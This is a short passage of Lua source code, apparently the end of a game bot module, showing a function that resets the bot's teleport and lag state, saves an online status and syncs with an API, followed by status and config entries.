        botState.currentTaskId = nil
        botState.teleportRetries = 0
        botState.teleportStartTime = 0
        botState.isLagging = false
        botState.lagEndTime = 0
        saveBotStatus("online")
        syncWithAPI()
    end,
    status = function()
        return botState
    end,
    config = CONFIG
}
